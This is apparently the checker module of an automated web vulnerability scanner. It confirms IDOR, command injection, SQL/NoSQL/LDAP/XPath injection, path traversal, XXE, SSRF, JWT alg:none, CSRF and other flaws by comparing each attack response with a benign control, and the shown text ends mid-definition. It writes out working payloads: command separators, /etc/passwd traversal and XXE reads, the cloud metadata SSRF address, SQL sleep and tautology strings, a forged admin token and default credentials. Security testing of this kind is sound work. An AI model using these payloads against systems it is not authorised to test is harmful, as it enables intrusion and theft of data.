"""Vulnerability checkers: one Strategy per class, registered so the scanner dispatches
by hypothesis class without a hardcoded branch (Open/Closed)."""
from __future__ import annotations

import base64
import json
import re
import secrets
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import urlencode, urlparse

from tools.httpx import Session, save_evidence

_PASSWD = re.compile(r"root:.*:0:0:")
SQL_ERROR_RE = re.compile(
    r"SQL syntax|SQLSTATE|unterminated quoted|quoted string not properly terminated|"
    r"unclosed quotation mark|ORA-\d|SQLITE_ERROR|sqlite3\.|psql:|PG::|"
    r"You have an error in your SQL|Microsoft OLE DB|ODBC SQL Server|"
    r'near "[^"]*": syntax error', re.I)


@dataclass
class CheckContext:
    me_path: str = "/me"
    actor: str = "user"


@dataclass
class CheckResult:
    status: str
    endpoint: str
    severity: str | None = None
    payload: str | None = None
    proof: str | None = None
    false_positive_reason: str | None = None
    files: list[str] = field(default_factory=list)


Checker = "Callable[[Session, dict, Path, CheckContext], CheckResult]"
REGISTRY: dict[str, "Checker"] = {}


def register(*classes):
    def decorate(fn):
        for cls in classes:
            REGISTRY[cls] = fn
        return fn
    return decorate


def get_checker(cls):
    return REGISTRY.get(cls)


def _around(value):
    return [value + 1, value - 1, value + 2, value + 3] if isinstance(value, int) else []


def _query_sender(session, endpoint, param, method):
    method = method.upper()

    def send(value):
        if method == "POST":
            return session.post(endpoint, data={param: value})
        return session.get(endpoint + "?" + urlencode({param: value}))
    return send


# Common second-identity names to try when object ids are usernames, not integers.
PEER_USERS = ("carlos", "administrator", "admin")


@register("IDOR")
def check_idor(session, hyp, ev_dir, ctx):
    if "{id}" in hyp["endpoint"]:
        return _idor_path(session, hyp, ev_dir, ctx)
    return _idor_param(session, hyp, ev_dir, ctx)


def _idor_path(session, hyp, ev_dir, ctx):
    template = hyp["endpoint"]
    id_field = hyp.get("id_field", "email")
    me = session.get(ctx.me_path).json()
    own = me.get("id") if isinstance(me, dict) else None
    discovered = [i for i in hyp.get("object_ids", []) if isinstance(i, int)]
    candidates = [c for c in dict.fromkeys(discovered + _around(own))
                  if isinstance(c, int) and c > 0 and c != own]

    baseline = session.get(template.format(id=own))
    files = save_evidence(ev_dir, "baseline-own", baseline)
    own_value = (baseline.json() or {}).get(id_field)

    last = None
    for victim in candidates:
        cross = session.get(template.format(id=victim))
        last = cross
        body = cross.json() or {}
        if (cross.status == 200 and body.get(id_field) not in (None, own_value)
                and str(body.get("id")) == str(victim)):
            files += save_evidence(ev_dir, "cross-victim", cross)
            return CheckResult(
                "confirmed", template.format(id=victim), "high",
                f"GET {template.format(id=victim)} with {ctx.actor}'s session",
                f"Session of '{ctx.actor}' read object id={victim} belonging to another "
                f"user ({id_field}={body.get(id_field)}).", files=files)

    if last is not None:
        files += save_evidence(ev_dir, "cross-victim", last)
        if last.status in (401, 403, 404):
            return CheckResult("false-positive", template, files=files,
                               false_positive_reason=f"cross-object request returned "
                                                     f"{last.status} (access controlled)")
    return CheckResult("unconfirmed", template, files=files)


def _idor_param(session, hyp, ev_dir, ctx):
    """Object id in a query/body parameter (e.g. /my-account?id=wiener). Differential:
    the response for a peer id must differ from our own and name that peer."""
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    own = ctx.actor

    baseline = send(own)
    files = save_evidence(ev_dir, "baseline-own", baseline)
    own_body = baseline.body or ""

    discovered = [str(i) for i in hyp.get("object_ids", [])]
    peers = [p for p in dict.fromkeys(discovered + list(PEER_USERS)) if p and p != own]

    last = None
    for peer in peers:
        cross = send(peer)
        last = cross
        body = cross.body or ""
        if cross.status == 200 and peer in body and body != own_body:
            files += save_evidence(ev_dir, "cross-victim", cross)
            return CheckResult(
                "confirmed", endpoint, "high", f"{param}={peer}",
                f"Session of '{own}' read another user's account via {param}={peer} "
                f"(response differs from own and names '{peer}').", files=files)

    if last is not None:
        files += save_evidence(ev_dir, "cross-victim", last)
        if last.status in (401, 403):
            return CheckResult("false-positive", endpoint, files=files,
                               false_positive_reason=f"cross-user request returned "
                                                     f"{last.status} (access controlled)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("CMDI")
def check_cmdi(session, hyp, ev_dir, ctx, blind_delay=1.0):
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    token = "HB" + secrets.token_hex(4)

    control = send(token)
    inject = send(f"x; echo {token}")
    files = save_evidence(ev_dir, "control-literal", control)
    files += save_evidence(ev_dir, "inject-reflected", inject)

    if token in inject.body and token not in control.body:
        return CheckResult("confirmed", endpoint, "high", f"{param}=x; echo {token}",
                           f"Unique marker {token} returned as command output "
                           f"(absent from the literal control).", files=files)
    if token in inject.body and token in control.body:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="marker reflected even without a command "
                                                 "separator (input echoed, not executed)")

    base0 = send("x; sleep 0")
    d1 = send(f"x; sleep {blind_delay}")
    d2 = send(f"x; sleep {blind_delay}")
    files += save_evidence(ev_dir, "timing-control-sleep0", base0)
    files += save_evidence(ev_dir, "timing-inject-sleepN", d1)
    threshold = blind_delay * 0.6
    if d1.elapsed - base0.elapsed >= threshold and d2.elapsed - base0.elapsed >= threshold:
        return CheckResult("confirmed", endpoint, "high", f"{param}=x; sleep {blind_delay}",
                           f"Injected sleep added ~{blind_delay}s vs a sleep-0 control "
                           f"(control={base0.elapsed:.2f}s, injected={d1.elapsed:.2f}s/"
                           f"{d2.elapsed:.2f}s), reproduced twice.", files=files)
    return CheckResult("unconfirmed", endpoint, files=files)


@register("PATH-TRAVERSAL", "PATH_TRAVERSAL")
def check_path_traversal(session, hyp, ev_dir, ctx, benign="welcome.txt"):
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))

    control = send(benign)
    files = save_evidence(ev_dir, "control-benign", control)
    control_leaks = bool(_PASSWD.search(control.body))

    payloads = ["../../../../../../etc/passwd",
                "....//....//....//....//....//....//etc/passwd"]
    statuses, last = [], None
    for payload in payloads:
        response = send(payload)
        last, statuses = response, statuses + [response.status]
        if _PASSWD.search(response.body) and not control_leaks:
            files += save_evidence(ev_dir, "traversal", response)
            return CheckResult("confirmed", endpoint, "high", f"{param}={payload}",
                               "Response contained /etc/passwd (line matching root:...:0:0:), "
                               "absent from the benign control.", files=files)

    files += save_evidence(ev_dir, "traversal", last)
    if all(s in (400, 401, 403, 404) for s in statuses):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason=f"traversal rejected/sanitized "
                                                 f"(statuses {statuses})")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("XSS")
def check_xss(session, hyp, ev_dir, ctx):
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    token = "HB" + secrets.token_hex(4)
    marker = f"<{token}>"

    control = send(token)
    inject = send(marker)
    files = save_evidence(ev_dir, "control-plain", control)
    files += save_evidence(ev_dir, "inject-xss", inject)

    is_html = "html" in inject.headers.get("Content-Type", "").lower()
    if is_html and marker in inject.body:
        return CheckResult("confirmed", endpoint, "medium", f"{param}={marker}",
                           f"Payload {marker} reflected unencoded in an HTML response "
                           "(executable markup context).", files=files)
    if f"&lt;{token}" in inject.body or (token in inject.body and marker not in inject.body):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="reflected value is HTML-encoded or "
                                                 "non-HTML (not executable)")
    return CheckResult("unconfirmed", endpoint, files=files)


_LOGIN_MARKERS = ('type="password"', "type=password", 'name="password"', 'action="/login"')


@register("ACCESS-CONTROL", "ACCESS_CONTROL")
def check_unauth_access(session, hyp, ev_dir, ctx):
    endpoint = hyp["endpoint"]
    anon = Session(session.base, timeout=session.timeout)
    resp = anon.get(endpoint)
    files = save_evidence(ev_dir, "anonymous", resp)
    body = resp.body or ""

    if resp.status in (401, 403) or any(m in body for m in _LOGIN_MARKERS):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason=f"anonymous request was rejected or sent "
                                                 f"to login (status {resp.status})")
    if resp.status == 200 and body.strip():
        return CheckResult("confirmed", endpoint, "high", f"GET {endpoint} with no session",
                           "Privileged endpoint served content to an unauthenticated request "
                           "(no login or authorization enforced).", files=files)
    return CheckResult("unconfirmed", endpoint, files=files)


@register("SQLI", "SQL-INJECTION")
def check_sqli(session, hyp, ev_dir, ctx):
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    benign = str(hyp.get("benign", "1"))

    control = send(benign)
    files = save_evidence(ev_dir, "control", control)
    control_err = bool(SQL_ERROR_RE.search(control.body))

    err = send(benign + "'")
    files += save_evidence(ev_dir, "error-probe", err)
    if SQL_ERROR_RE.search(err.body) and not control_err:
        return CheckResult("confirmed", endpoint, "high", f"{param}={benign}'",
                           "A single quote triggered a database error absent from the benign "
                           "control (error-based SQL injection).", files=files)

    t = send(benign + "' OR '1'='1")
    f = send(benign + "' AND '1'='2")
    files += save_evidence(ev_dir, "boolean-true", t)
    files += save_evidence(ev_dir, "boolean-false", f)
    if t.status == 200 and f.status == 200 and t.body != f.body and len(t.body) > len(f.body):
        return CheckResult("confirmed", endpoint, "high",
                           f"{param}={benign}' OR '1'='1 (vs ' AND '1'='2)",
                           "An always-true condition returned more data than an always-false "
                           "one (boolean-based SQL injection).", files=files)

    delay = int(hyp.get("sqli_delay", 2))
    d1 = send(benign + f"' OR pg_sleep({delay})--")
    d2 = send(benign + f"' OR pg_sleep({delay})--")
    files += save_evidence(ev_dir, "time-inject", d1)
    threshold = delay * 0.6
    if d1.elapsed - control.elapsed >= threshold and d2.elapsed - control.elapsed >= threshold:
        return CheckResult("confirmed", endpoint, "high",
                           f"{param}={benign}' OR pg_sleep({delay})--",
                           f"Injected pg_sleep({delay}) delayed the response ~{delay}s vs "
                           f"control, reproduced twice (time-based blind SQL injection).",
                           files=files)

    if not SQL_ERROR_RE.search(err.body) and t.body == f.body:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="single quote caused no error and boolean "
                                                 "payloads returned identical results "
                                                 "(input appears parameterized)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("SSTI")
def check_ssti(session, hyp, ev_dir, ctx):
    """Server-side template injection: a math expression wrapped in an engine's delimiters
    is evaluated server-side. Differential: a distinctive product appears only when the
    expression is rendered, never from the literal control."""
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    a, b = secrets.randbelow(900) + 100, secrets.randbelow(900) + 100
    product = str(a * b)
    payloads = [f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}", f"<%= {a}*{b} %>"]

    control = send("HB" + secrets.token_hex(4))
    files = save_evidence(ev_dir, "control-literal", control)

    last = None
    for payload in payloads:
        inject = send(payload)
        last = inject
        if product in inject.body and product not in control.body:
            files += save_evidence(ev_dir, "inject-ssti", inject)
            return CheckResult("confirmed", endpoint, "high", f"{param}={payload}",
                               f"Template expression {payload} was evaluated server-side "
                               f"(response contains the product {product}, absent from the "
                               f"literal control).", files=files)

    files += save_evidence(ev_dir, "inject-ssti", last)
    if last is not None and str(a) in last.body and str(b) in last.body:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="template payload reflected literally or "
                                                 "encoded, not evaluated as an expression")
    return CheckResult("unconfirmed", endpoint, files=files)


_REDIRECT_CODES = {301, 302, 303, 307, 308}


@register("OPEN-REDIRECT", "OPEN_REDIRECT")
def check_open_redirect(session, hyp, ev_dir, ctx):
    """Open redirect: a destination parameter sends the browser to an attacker-controlled
    host. The client never follows the 3xx (allow_redirects=False), so the Location header
    is read without leaving scope; the marker host (.example) is never contacted."""
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    method = hyp.get("method", "GET").upper()
    marker = "evil-" + secrets.token_hex(3) + ".example"
    payloads = [f"https://{marker}/hb", f"//{marker}/hb"]

    def send(value):
        if method == "POST":
            return session.post(endpoint, data={param: value}, allow_redirects=False)
        return session.get(endpoint + "?" + urlencode({param: value}), allow_redirects=False)

    files, saw_redirect, last = [], False, None
    for i, payload in enumerate(payloads):
        resp = send(payload)
        last = resp
        files += save_evidence(ev_dir, f"redirect-probe-{i}", resp)
        location = next((v for k, v in resp.headers.items() if k.lower() == "location"), "")
        if resp.status in _REDIRECT_CODES:
            saw_redirect = True
            host = urlparse(location).netloc or urlparse("//" + location.lstrip("/")).netloc
            if host == marker:
                return CheckResult("confirmed", endpoint, "medium", f"{param}={payload}",
                                   f"Redirect sent to attacker-controlled host "
                                   f"(Location: {location}).", files=files)

    if saw_redirect:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="redirect destination validated or confined "
                                                 "to the same site (no off-site Location)")
    return CheckResult("unconfirmed", endpoint, files=files)


# Distinctive strings a cloud instance-metadata endpoint returns; strong SSRF signal.
_METADATA_MARKERS = ("iam/security-credentials", "ami-id", "instance-id")


@register("SSRF")
def check_ssrf(session, hyp, ev_dir, ctx):
    """Server-side request forgery: the server fetches a URL the client supplies. Probe the
    cloud instance-metadata address; confirm when its distinctive content comes back,
    absent from a benign external control. The scanner's client only ever talks to the
    in-scope target — the metadata address is a string in the parameter, never contacted
    by us."""
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))

    control = send("https://example.com/")
    probe = send("http://169.254.169.254/latest/meta-data/")
    files = save_evidence(ev_dir, "control-external", control)
    files += save_evidence(ev_dir, "probe-metadata", probe)

    hit = [m for m in _METADATA_MARKERS if m in probe.body and m not in control.body]
    if hit:
        return CheckResult("confirmed", endpoint, "high",
                           f"{param}=http://169.254.169.254/latest/meta-data/",
                           f"Server fetched the cloud metadata endpoint; response carried "
                           f"internal-only content ({', '.join(hit)}).", files=files)
    if probe.status in (400, 403) and control.status == 200:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="internal/link-local address blocked while "
                                                 "an external URL is allowed")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("CORS")
def check_cors(session, hyp, ev_dir, ctx):
    """CORS misconfiguration: the endpoint reflects an arbitrary Origin into
    Access-Control-Allow-Origin, letting any site read the response. Worst with
    Access-Control-Allow-Credentials: true, which exposes authenticated data."""
    endpoint = hyp["endpoint"]
    marker = "https://evil-" + secrets.token_hex(3) + ".example"
    resp = session.get(endpoint, headers={"Origin": marker})
    files = save_evidence(ev_dir, "cors-probe", resp)
    acao = next((v for k, v in resp.headers.items()
                 if k.lower() == "access-control-allow-origin"), "")
    acac = next((v for k, v in resp.headers.items()
                 if k.lower() == "access-control-allow-credentials"), "").lower()

    if acao == marker or (acao == "*" and acac == "true"):
        with_creds = acac == "true"
        detail = ("reflected the attacker Origin" if acao == marker
                  else "served a wildcard origin")
        return CheckResult(
            "confirmed", endpoint, "high" if with_creds else "medium", f"Origin: {marker}",
            f"Access-Control-Allow-Origin {detail}" +
            (" with Access-Control-Allow-Credentials: true (authenticated cross-origin "
             "reads)." if with_creds else " (cross-origin reads allowed)."), files=files)
    if acao:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason=f"Access-Control-Allow-Origin is fixed "
                                                 f"({acao}), not reflected")
    return CheckResult("unconfirmed", endpoint, files=files)


_XXE_DOC = ('<?xml version="1.0"?>\n'
            '<!DOCTYPE root [<!ENTITY {ent} SYSTEM "file:///etc/passwd">]>\n'
            '<root>&{ent};</root>')


@register("XXE")
def check_xxe(session, hyp, ev_dir, ctx):
    """XML external entity injection: a parser resolves an external SYSTEM entity, pulling a
    local file into the response. Confirm by referencing /etc/passwd; a benign control (same
    doc, no entity) must not leak it. One read-only file reference is proof."""
    endpoint = hyp["endpoint"]
    ent = "hb" + secrets.token_hex(3)
    headers = {"Content-Type": "application/xml"}

    control = session.post(endpoint, raw="<?xml version=\"1.0\"?><root>ok</root>",
                           headers=headers)
    inject = session.post(endpoint, raw=_XXE_DOC.format(ent=ent), headers=headers)
    files = save_evidence(ev_dir, "control-noentity", control)
    files += save_evidence(ev_dir, "inject-xxe", inject)

    if _PASSWD.search(inject.body) and not _PASSWD.search(control.body):
        return CheckResult("confirmed", endpoint, "high",
                           'SYSTEM "file:///etc/passwd"',
                           "External entity resolved to /etc/passwd (root:...:0:0: present), "
                           "absent from the entity-free control.", files=files)
    if f"&{ent};" in inject.body:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="external entities are not resolved "
                                                 "(reference returned unexpanded)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("HOST-HEADER", "HOST_HEADER")
def check_host_header(session, hyp, ev_dir, ctx):
    """Host header injection: the app builds an absolute URL (e.g. a password-reset link)
    from the attacker-controlled Host header. Confirm by sending a marker Host and finding
    it reflected into the response, where it was not with the real Host."""
    endpoint = hyp["endpoint"]
    marker = "evil-" + secrets.token_hex(3) + ".example"

    control = session.get(endpoint)
    inject = session.get(endpoint, headers={"Host": marker})
    files = save_evidence(ev_dir, "control-host", control)
    files += save_evidence(ev_dir, "inject-host", inject)

    if marker in inject.body and marker not in control.body:
        return CheckResult("confirmed", endpoint, "medium", f"Host: {marker}",
                           f"The request Host header was reflected into the response "
                           f"({marker}), so a generated link can be pointed at an attacker "
                           "host.", files=files)
    if control.status == 200 and marker not in inject.body:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="response uses a fixed canonical host, not "
                                                 "the request Host header")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("CSRF")
def check_csrf(session, hyp, ev_dir, ctx):
    """CSRF: a state-changing request is accepted with no unpredictable anti-CSRF token, so
    another site can forge it using the victim's cookies. Confirm by submitting the change
    without any token; a rejection (token required) is a false positive."""
    endpoint = hyp["endpoint"]
    param = hyp.get("parameter") or "email"
    marker = "hb" + secrets.token_hex(3) + "@evil.example"

    resp = session.post(endpoint, data={param: marker})  # deliberately no CSRF token
    files = save_evidence(ev_dir, "no-token", resp)
    body = (resp.body or "").lower()

    if resp.status == 200 and marker in (resp.body or ""):
        return CheckResult("confirmed", endpoint, "medium", f"POST {param}={marker} (no token)",
                           "State change was accepted without any anti-CSRF token, so it can "
                           "be forged cross-site using the victim's session.", files=files)
    if resp.status in (400, 403) or "csrf" in body or "token" in body:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="request without a CSRF token was rejected "
                                                 "(anti-CSRF protection present)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("CLICKJACKING")
def check_clickjacking(session, hyp, ev_dir, ctx):
    """Clickjacking: an HTML page served with neither X-Frame-Options nor a CSP
    frame-ancestors directive can be framed by any site and overlaid for UI redress."""
    endpoint = hyp["endpoint"]
    resp = session.get(endpoint)
    files = save_evidence(ev_dir, "frame-headers", resp)
    hdrs = {k.lower(): v for k, v in resp.headers.items()}
    is_html = "html" in hdrs.get("content-type", "").lower()
    csp = hdrs.get("content-security-policy", "").lower()
    framed_denied = bool(hdrs.get("x-frame-options")) or "frame-ancestors" in csp

    if resp.status == 200 and is_html and not framed_denied:
        return CheckResult("confirmed", endpoint, "low", "no X-Frame-Options / frame-ancestors",
                           "HTML page served without X-Frame-Options or a CSP frame-ancestors "
                           "directive, so any site can frame it (clickjacking).", files=files)
    if framed_denied:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="X-Frame-Options or CSP frame-ancestors is "
                                                 "set (framing denied)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("GRAPHQL", "GRAPHQL-INTROSPECTION")
def check_graphql(session, hyp, ev_dir, ctx):
    """GraphQL introspection: the endpoint answers an introspection query, disclosing the
    full schema (types, fields, mutations) to anyone — useful recon for an attacker."""
    endpoint = hyp["endpoint"]
    resp = session.post(endpoint, json_body={"query": "{__schema{queryType{name} types{name}}}"})
    files = save_evidence(ev_dir, "introspection", resp)
    body = resp.body or ""

    if resp.status == 200 and "__schema" in body:
        return CheckResult("confirmed", endpoint, "low", "{__schema{types{name}}}",
                           "GraphQL introspection is enabled; the full schema is disclosed.",
                           files=files)
    if "introspection" in body.lower() or resp.status in (400, 403):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="introspection is disabled or rejected")
    return CheckResult("unconfirmed", endpoint, files=files)


def _jwt_segment(obj):
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()


@register("JWT")
def check_jwt(session, hyp, ev_dir, ctx):
    """JWT alg:none: a forged token with header {"alg":"none"} and no signature is accepted,
    letting an attacker assert any identity. Confirm by claiming 'administrator' with an
    unsigned token; a rejection is a false positive."""
    endpoint = hyp["endpoint"]
    forged = (_jwt_segment({"alg": "none", "typ": "JWT"}) + "." +
              _jwt_segment({"user": "administrator", "role": "admin"}) + ".")
    resp = session.get(endpoint, headers={"Authorization": f"Bearer {forged}"})
    files = save_evidence(ev_dir, "alg-none", resp)
    body = resp.body or ""

    if resp.status == 200 and "administrator" in body:
        return CheckResult("confirmed", endpoint, "high", f"Bearer {forged}",
                           "An unsigned alg:none token asserting 'administrator' was "
                           "accepted; identity can be forged without the signing key.",
                           files=files)
    if resp.status in (401, 403):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="unsigned (alg:none) token was rejected")
    return CheckResult("unconfirmed", endpoint, files=files)


_TRACE_RE = re.compile(
    r"Traceback \(most recent call last\)|File \"[^\"]+\", line \d+|"
    r"\bat [\w.$]+\([\w.$]+\.\w+:\d+\)|Exception in thread|"
    r"(?:Fatal error|Warning|Notice):.*on line \d+|org\.\w+(?:\.\w+)+Exception", re.I)


@register("INFO-DISCLOSURE", "INFO_DISCLOSURE")
def check_info_disclosure(session, hyp, ev_dir, ctx):
    """Verbose errors: malformed input makes the server return a stack trace or framework
    error, disclosing internals. Confirm by sending junk and matching a trace signature."""
    endpoint, param = hyp["endpoint"], hyp.get("parameter") or "n"
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))

    control = send("1")
    bad = send("'\"`<xyz>@%zz")
    files = save_evidence(ev_dir, "control", control)
    files += save_evidence(ev_dir, "malformed", bad)

    if _TRACE_RE.search(bad.body) and not _TRACE_RE.search(control.body):
        return CheckResult("confirmed", endpoint, "medium", f"{param}=malformed",
                           "Malformed input returned a stack trace / framework error "
                           "disclosing server internals.", files=files)
    if bad.status in (400, 422) and not _TRACE_RE.search(bad.body):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="malformed input returned a generic error "
                                                 "with no server internals")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("DIR-LISTING", "DIR_LISTING", "DIRECTORY-LISTING")
def check_dir_listing(session, hyp, ev_dir, ctx):
    """Directory listing: a directory path returns an auto-generated index of its files."""
    endpoint = hyp["endpoint"]
    resp = session.get(endpoint)
    files = save_evidence(ev_dir, "listing", resp)
    if resp.status == 200 and re.search(r"Index of /|Directory listing for|<title>\s*Index of",
                                        resp.body, re.I):
        return CheckResult("confirmed", endpoint, "low", f"GET {endpoint}",
                           "Directory index is exposed (auto-generated file listing).",
                           files=files)
    if resp.status in (401, 403, 404):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason=f"directory access returned {resp.status} "
                                                 "(listing not exposed)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("LDAPI", "LDAP", "LDAP-INJECTION")
def check_ldapi(session, hyp, ev_dir, ctx):
    """LDAP injection: filter metacharacters injected into an LDAP query change its logic
    (e.g. a wildcard/always-true clause returns records a benign lookup does not)."""
    endpoint, param = hyp["endpoint"], hyp.get("parameter") or "user"
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    control = send("nobody-" + secrets.token_hex(3))
    inject = send("*)(uid=*))(|(uid=*")
    files = save_evidence(ev_dir, "control", control)
    files += save_evidence(ev_dir, "inject-ldap", inject)

    if inject.status == 200 and len(inject.body) > len(control.body) + 2:
        return CheckResult("confirmed", endpoint, "high", f"{param}=*)(uid=*))(|(uid=*",
                           "An LDAP filter injection returned records the benign lookup did "
                           "not (filter logic altered).", files=files)
    if len(inject.body) <= len(control.body):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="LDAP metacharacters appear escaped "
                                                 "(no extra records returned)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("MASS-ASSIGNMENT", "MASS_ASSIGNMENT")
def check_mass_assignment(session, hyp, ev_dir, ctx):
    """Mass assignment: the endpoint binds a privileged field (role) from the request body
    that a client should not control, escalating privilege."""
    endpoint = hyp["endpoint"]
    marker = "hb" + secrets.token_hex(3)
    resp = session.post(endpoint, data={"name": marker, "role": "admin"})
    files = save_evidence(ev_dir, "inject-role", resp)
    data = resp.json()

    if resp.status == 200 and isinstance(data, dict) and data.get("role") == "admin":
        return CheckResult("confirmed", endpoint, "high", "role=admin (unexpected field)",
                           "The server bound a privileged 'role' field from the request body "
                           "(mass assignment / privilege escalation).", files=files)
    if isinstance(data, dict) and "role" in data and data.get("role") != "admin":
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason=f"privileged field ignored (role stayed "
                                                 f"'{data.get('role')}')")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("USER-ENUM", "USER_ENUM")
def check_user_enum(session, hyp, ev_dir, ctx):
    """Username enumeration: the login response differs for a valid vs an invalid username,
    letting an attacker learn which accounts exist."""
    endpoint = hyp["endpoint"]
    pw = "wrong-" + secrets.token_hex(3)
    valid = session.post(endpoint, data={"username": ctx.actor, "password": pw})
    invalid = session.post(endpoint,
                           data={"username": "nouser-" + secrets.token_hex(4), "password": pw})
    files = save_evidence(ev_dir, "valid-username", valid)
    files += save_evidence(ev_dir, "invalid-username", invalid)

    if valid.status != invalid.status or (valid.body or "") != (invalid.body or ""):
        return CheckResult("confirmed", endpoint, "medium",
                           f"username={ctx.actor} vs a random username",
                           "The login response differs for a valid versus an invalid "
                           "username, disclosing which accounts exist.", files=files)
    return CheckResult("false-positive", endpoint, files=files,
                       false_positive_reason="identical response for valid and invalid "
                                             "usernames (no oracle)")


@register("PROTO-POLLUTION", "PROTOTYPE-POLLUTION", "PROTO_POLLUTION")
def check_proto_pollution(session, hyp, ev_dir, ctx):
    """Prototype pollution: a JSON-merge endpoint honors a __proto__ key, letting attacker
    data land on the object prototype."""
    endpoint = hyp["endpoint"]
    marker = "hb" + secrets.token_hex(3)
    resp = session.post(endpoint, json_body={"__proto__": {"hbflag": marker}})
    files = save_evidence(ev_dir, "proto-merge", resp)
    body = resp.body or ""

    if marker in body:
        return CheckResult("confirmed", endpoint, "high", '{"__proto__":{"hbflag":"..."}}',
                           "A __proto__ key from the request body polluted the merged object "
                           "(prototype pollution).", files=files)
    if resp.status == 200:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="__proto__ key did not pollute the object "
                                                 "(stripped or ignored)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("NOSQLI", "NOSQL", "NOSQL-INJECTION")
def check_nosqli(session, hyp, ev_dir, ctx):
    """NoSQL injection: a JSON login/query endpoint accepts a query operator object ($ne)
    in place of a string value, bypassing authentication."""
    endpoint = hyp["endpoint"]
    pw = "wrong-" + secrets.token_hex(3)
    control = session.post(endpoint, json_body={"user": ctx.actor, "password": pw})
    inject = session.post(endpoint, json_body={"user": ctx.actor, "password": {"$ne": pw}})
    files = save_evidence(ev_dir, "control", control)
    files += save_evidence(ev_dir, "inject-operator", inject)

    if inject.status == 200 and control.status != 200:
        return CheckResult("confirmed", endpoint, "high", '{"password":{"$ne":"..."}}',
                           "A query operator ($ne) in the JSON body bypassed authentication "
                           "where a normal wrong password failed (NoSQL injection).",
                           files=files)
    if inject.status == control.status:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="operator object treated as a literal value "
                                                 "(no bypass)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("XPATHI", "XPATH", "XPATH-INJECTION")
def check_xpathi(session, hyp, ev_dir, ctx):
    """XPath injection: a search backed by an XPath query lets a quote breakout alter the
    query logic and return records it should not."""
    endpoint = hyp["endpoint"]
    param = hyp.get("parameter") or "xp"
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    control = send("nobody-" + secrets.token_hex(3))
    inject = send("' or '1'='1")
    files = save_evidence(ev_dir, "control", control)
    files += save_evidence(ev_dir, "inject-xpath", inject)
    cbody, ibody = control.body or "", inject.body or ""

    if inject.status == 200 and len(ibody) > len(cbody) + 2:
        return CheckResult("confirmed", endpoint, "high", "' or '1'='1",
                           "A quote breakout returned more records than a benign query "
                           "(XPath injection).", files=files)
    if len(ibody) <= len(cbody):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="quote neutralized; injection returned no "
                                                 "extra records")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("INSECURE-COOKIE", "INSECURE_COOKIE")
def check_insecure_cookie(session, hyp, ev_dir, ctx):
    """Insecure cookie: a session cookie is set without the HttpOnly/Secure flags, exposing
    it to theft via script or plaintext transport."""
    endpoint = hyp["endpoint"]
    resp = session.get(endpoint)
    files = save_evidence(ev_dir, "set-cookie", resp)
    setc = next((v for k, v in resp.headers.items() if k.lower() == "set-cookie"), "")
    if not setc:
        return CheckResult("unconfirmed", endpoint, files=files)
    missing = [flag for flag in ("httponly", "secure") if flag not in setc.lower()]
    if missing:
        return CheckResult("confirmed", endpoint, "low", setc.split(";")[0],
                           "Session cookie set without " + " and ".join(missing)
                           + " (insecure cookie).", files=files)
    return CheckResult("false-positive", endpoint, files=files,
                       false_positive_reason="cookie carries HttpOnly and Secure flags")


_DEFAULT_CREDS = (("admin", "admin"), ("admin", "password"), ("administrator", "admin"),
                  ("root", "root"), ("admin", "123456"))


@register("DEFAULT-CREDS", "DEFAULT_CREDS", "DEFAULT-CREDENTIALS")
